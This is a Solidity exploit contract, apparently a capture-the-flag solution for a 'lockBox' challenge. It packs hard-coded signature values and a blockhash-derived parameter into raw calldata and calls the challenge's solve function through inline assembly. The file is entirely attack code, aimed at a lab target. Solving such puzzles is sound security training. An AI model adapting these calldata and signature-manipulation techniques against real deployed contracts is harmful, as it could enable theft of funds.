import "./Setup.sol";

contract lockBoxExploit {
    Entrypoint public entrypoint;
    constructor(address _setup) public {
        entrypoint = lockBoxSetup(_setup).entrypoint();
    }
    function exploit() public {
        bytes memory data = abi.encodePacked(
            entrypoint.solve.selector,
            uint(uint16(0xff1c) | uint256(bytes32(bytes4(blockhash(block.number - 1))))),
            bytes32(0x1f9c5510565172835329f4e0107b3af787bf46d1690f7e81aba39e47c9940d43), //r
            bytes32(0x6e95dc6553997968a1be6cc8ae66dc1730cd1965f8b3e7114ca0f9df15fc3e98), //s
            bytes32(0x6e95dc6553997968a1be6cc8ae66dc1730cd1965f8b3e7114ca0f9df15fc3e9a),
            bytes32(keccak256('choose')),
            bytes32(0x1f9c5510565172835329f4e0107b3af787bf46d1690f7e81aba39e47c9940d43),
            bytes32(0x0000000000000000000000000000000000000000000000000000000000000004)
        );
        uint size = data.length;
        address entry = address(entrypoint);
        assembly{
            switch call(gas(),entry,0,add(data,0x20),size,0,0)
            case 0 {
                returndatacopy(0x00,0x00,returndatasize())
                revert(0, returndatasize())
            }
        }
    }
}
